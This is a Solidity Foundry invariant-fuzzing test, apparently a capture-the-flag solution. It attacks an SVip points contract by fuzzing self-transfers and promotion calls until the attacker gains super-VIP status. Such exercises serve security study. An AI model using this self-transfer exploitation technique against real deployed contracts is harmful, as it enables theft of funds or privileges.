// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "./vulnerableContract.sol";

contract Attack is Test{
    SVip svip;

    function setUp() public{

        svip = new SVip();
        for(uint256 i = 0;i < 99; i++){
            svip.getPoint();
        }

        targetContract(address(this));
        targetSender(address(this));

        bytes4[] memory selectors = new bytes4[](2);
        selectors[0] = this.transferPoints.selector;
        selectors[1] = this.promotionSVip.selector;
        targetSelector(
            FuzzSelector({addr: address(this), selectors: selectors})
        );
    }

    function transferPoints(uint256 amount) public{
        amount = bound(amount, 0, svip.points(address(this)) - 1); // 在1~9之间
        svip.transferPoints(address(this), amount);
    }

    function promotionSVip() public{
        svip.promotionSVip();
    }

    function invariant_trySolve() public{
        require(svip.isSuperVip(address(this)) == false);
    }
}

